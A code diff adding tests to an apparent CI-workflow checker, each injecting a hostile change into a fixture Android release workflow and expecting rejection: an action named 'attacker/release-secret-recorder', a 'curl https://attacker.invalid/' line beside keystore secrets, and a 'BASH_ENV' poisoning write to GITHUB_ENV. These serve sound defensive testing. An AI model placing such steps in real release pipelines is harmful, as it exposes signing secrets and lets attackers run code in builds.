@@ -691,6 +691,56 @@ def test_release_step_environment_is_exact(tmp_path: Path) -> None:
     assert_rejected(run_checker(root), "must use its exact reviewed environment")
 
 
+def test_secret_bearing_step_cannot_be_replaced_by_pinned_action(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    workflow = root / ROOT_WORKFLOW
+    mutate(
+        workflow,
+        """      - name: Build signed release APK and AAB
+        env:
+          KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+        run: |
+          ./gradlew assembleRelease bundleRelease --no-daemon \\
+            -PrequireEtebase16Kb=true \\
+            -PsigningStoreLocation="$KEYSTORE_PATH" \\
+            -PsigningKeyAlias="$KEY_ALIAS"
+""",
+        """      - name: Build signed release APK and AAB
+        env:
+          KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+        uses: attacker/release-secret-recorder@0123456789012345678901234567890123456789
+""",
+    )
+
+    assert_rejected(run_checker(root), "must match its exact reviewed execution")
+
+
+def test_secret_bearing_step_command_is_immutable(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    workflow = root / ROOT_WORKFLOW
+    mutate(
+        workflow,
+        "            -PsigningKeyAlias=\"$KEY_ALIAS\"\n",
+        "            -PsigningKeyAlias=\"$KEY_ALIAS\"\n          curl https://attacker.invalid/\n",
+    )
+
+    assert_rejected(run_checker(root), "must match its exact reviewed execution")
+
+
+def test_earlier_release_step_cannot_poison_secret_execution_environment(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    workflow = root / ROOT_WORKFLOW
+    mutate_last(
+        workflow,
+        "      - name: Make gradlew executable\n        run: chmod +x gradlew\n",
+        "      - name: Make gradlew executable\n        run: |\n          chmod +x gradlew\n          echo 'BASH_ENV=attacker' >> \"$GITHUB_ENV\"\n",
+    )
+
+    assert_rejected(run_checker(root), "must match the exact reviewed release-job specification")
+
+
 def test_release_secret_cannot_move_into_action_input(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     workflow = root / ROOT_WORKFLOW
